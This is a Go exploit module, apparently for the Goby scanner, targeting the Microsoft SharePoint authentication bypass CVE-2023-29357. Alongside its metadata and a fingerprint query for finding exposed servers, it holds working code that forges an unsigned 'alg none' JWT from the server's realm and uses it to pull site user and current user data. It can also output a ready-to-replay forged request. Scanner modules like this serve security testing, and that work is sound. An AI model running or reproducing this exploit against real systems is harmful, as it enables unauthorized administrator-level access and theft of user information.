package exploits

import (
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Microsoft SharePoint Authorization Api Permission Bypass Vulnerability (CVE-2023-29357)",
    "Description": "<p>Microsoft SharePoint is an enterprise business collaboration platform of Microsoft Corporation in the United States. This platform is used to integrate business information, and can share work, collaborate with others, organize projects and workgroups, search for people and information.</p><p>There is a privilege bypass vulnerability in the Microsoft SharePoint authentication interface, which allows attackers to bypass security mechanisms, obtain administrator privileges, take over the system backend, maliciously execute code, write backdoors, and read sensitive files, resulting in the server being attacked and controlled.</p>",
    "Product": "Microsoft-SharePoint",
    "Homepage": "https://www.microsoft.com/zh-cn/",
    "DisclosureDate": "2023-06-05",
    "PostTime": "2023-10-13",
    "Author": "featherstark@outlook.com",
    "FofaQuery": "header=\"Microsoftsharepointteamservices\" || header=\"X-Sharepointhealthscore\" || header=\"Sharepointerror\" || header=\"Sprequestduration\" || body=\"content=\\\"Microsoft SharePoint\" || body=\"content=\\\"SharePoint Team\" || body=\"id=\\\"MSOWebPartPage_PostbackSource\" || banner=\"Microsoftsharepointteamservices\" || banner=\"X-Sharepointhealthscore\" || banner=\"Sharepointerror\" || banner=\"Sprequestduration\"",
    "GobyQuery": "header=\"Microsoftsharepointteamservices\" || header=\"X-Sharepointhealthscore\" || header=\"Sharepointerror\" || header=\"Sprequestduration\" || body=\"content=\\\"Microsoft SharePoint\" || body=\"content=\\\"SharePoint Team\" || body=\"id=\\\"MSOWebPartPage_PostbackSource\" || banner=\"Microsoftsharepointteamservices\" || banner=\"X-Sharepointhealthscore\" || banner=\"Sharepointerror\" || banner=\"Sprequestduration\"",
    "Level": "3",
    "Impact": "<p>There is a privilege bypass vulnerability in the Microsoft SharePoint authentication interface, which allows attackers to bypass security mechanisms, obtain administrator privileges, take over the system backend, maliciously execute code, write backdoors, and read sensitive files, resulting in the server being attacked and controlled.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "usersInfo,jwtToken",
            "show": ""
        },
        {
            "name": "usersApi",
            "type": "select",
            "value": "siteusers,currentuser",
            "show": "attackType=usersInfo"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-29357"
    ],
    "CNNVD": [
        "CNNVD-202306-940"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Microsoft SharePoint Authorization 接口权限绕过漏洞（CVE-2023-29357）",
            "Product": "Microsoft-SharePoint",
            "Description": "<p>Microsoft SharePoint 是美国微软（Microsoft）公司的一套企业业务协作平台。该平台用于对业务信息进行整合，并能够共享工作、与他人协同工作、组织项目和工作组、搜索人员和信息。</p><p>Microsoft SharePoint 认证接口存在权限绕过漏洞，攻击者可以通过绕过安全机制，获取管理员权限，接管系统后台，恶意执行代码、写入后门、读取敏感文件，从而导致服务器受到攻击并被控制。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357\" target=\"_blank\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357</a><br></p>",
            "Impact": "<p>Microsoft SharePoint 认证接口存在权限绕过漏洞，攻击者可以通过绕过安全机制，获取管理员权限，接管系统后台，恶意执行代码、写入后门、读取敏感文件，从而导致服务器受到攻击并被控制。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Microsoft SharePoint Authorization Api Permission Bypass Vulnerability (CVE-2023-29357)",
            "Product": "Microsoft-SharePoint",
            "Description": "<p>Microsoft SharePoint is an enterprise business collaboration platform of Microsoft Corporation in the United States. This platform is used to integrate business information, and can share work, collaborate with others, organize projects and workgroups, search for people and information.</p><p>There is a privilege bypass vulnerability in the Microsoft SharePoint authentication interface, which allows attackers to bypass security mechanisms, obtain administrator privileges, take over the system backend, maliciously execute code, write backdoors, and read sensitive files, resulting in the server being attacked and controlled.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357\" target=\"_blank\">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29357</a><br></p>",
            "Impact": "<p>There is a privilege bypass vulnerability in the Microsoft SharePoint authentication interface, which allows attackers to bypass security mechanisms, obtain administrator privileges, take over the system backend, maliciously execute code, write backdoors, and read sensitive files, resulting in the server being attacked and controlled.</p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10849"
}`

	getRealmIDDKJQWPOIUE := func(hostInfo *httpclient.FixUrl) (string, error) {
		cfg := httpclient.NewGetRequestConfig("/_api/web/siteusers")
		cfg.Header.Store("Authorization", "Bearer ")
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return "", err
		} else if strings.Contains(resp.HeaderString.String(), "realm=") {
			for _, line := range resp.HeaderString.Lines {
				realm := regexp.MustCompile(`realm="(.*?)"`).FindStringSubmatch(line)
				if len(realm) > 1 {
					return realm[1], nil
				}
			}
		}
		return "", errors.New("漏洞利用失败")
	}

	generateJwtTokenDJQIWOPEYU := func(hostInfo *httpclient.FixUrl) (string, error) {
		realm, err := getRealmIDDKJQWPOIUE(hostInfo)
		if err != nil {
			return "", err
		}
		clientId := "00000003-0000-0ff1-ce00-000000000000"
		header := map[string]interface{}{
			"alg": "none",
		}
		payload := map[string]interface{}{
			"aud":               fmt.Sprintf("%s@%s", clientId, realm),
			"iss":               clientId,
			"nbf":               1695987703,
			"exp":               2011547223,
			"ver":               "hashedprooftoken",
			"nameid":            fmt.Sprintf("%s@%s", clientId, realm),
			"endpointurl":       "qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=",
			"endpointurlLength": 1,
			"isloopback":        true,
		}
		headerJsonByte, err := json.Marshal(header)
		if err != nil {
			return "", err
		}
		payloadJsonByte, err := json.Marshal(payload)
		if err != nil {
			return "", err
		}
		//header := `{"alg":"none"}`
		//payload := fmt.Sprintf(`{"aud":"%s@%s","iss":"%s","nbf":1695987703,"exp":2011547223,"ver":"hashedprooftoken","nameid":"%s@%s","endpointurl":"qqlAJmTxpB9A67xSyZk+tmrrNmYClY/fqig7ceZNsSM=","endpointurlLength":1,"isloopback":true}`, clientId, realm, clientId, clientId, realm)
		encodedHeader := base64.RawURLEncoding.EncodeToString(headerJsonByte)
		encodedPayload := base64.RawURLEncoding.EncodeToString(payloadJsonByte)
		return fmt.Sprintf("%s.%s.AAA", encodedHeader, encodedPayload), nil
	}

	getLeakInformationDJQWIORUZXC := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		jwtToken, err := generateJwtTokenDJQIWOPEYU(hostInfo)
		if err != nil {
			return nil, err
		}
		cfg := httpclient.NewGetRequestConfig(uri)
		cfg.Header.Store("Authorization", "Bearer "+jwtToken)
		cfg.Header.Store("Accept", "application/json")
		cfg.Header.Store("X-PROOF_TOKEN", jwtToken)
		resp, err := httpclient.DoHttpRequest(hostInfo, cfg)
		if err != nil {
			return nil, err
		} else if resp.StatusCode != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			resp, _ := getLeakInformationDJQWIORUZXC(hostInfo, "/_api/web/siteusers")
			return resp != nil && strings.Contains(resp.Utf8Html, "LoginName") && strings.Contains(resp.Utf8Html, "IsSiteAdmin") && strings.Contains(resp.Utf8Html, "IsHiddenInUI")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			if attackType == "usersInfo" || attackType == "jwtToken" {
				path := stepLogs.Params["usersApi"].(string)
				uri := "/_api/web/siteusers"
				if path == "currentuser" {
					uri = "/_api/web/currentuser"
				}
				resp, err := getLeakInformationDJQWIORUZXC(expResult.HostInfo, uri)
				if err != nil {
					expResult.Output = err.Error()
				} else if len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
					if attackType == "jwtToken" {
						jwtToken := resp.Request.Header.Get("X-PROOF_TOKEN")
						expResult.Output = fmt.Sprintf(`GET /_api/web/siteusers HTTP/1.1
Host: %s
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept: application/json
Authorization: Bearer %s
X-Proof_token: %s
Accept-Encoding: gzip, deflate
Connection: close`, expResult.HostInfo.HostInfo, jwtToken, jwtToken)
					}
				} else {
					expResult.Output = `漏洞利用失败`
				}
				return expResult
			}
			return expResult
		},
	))
}
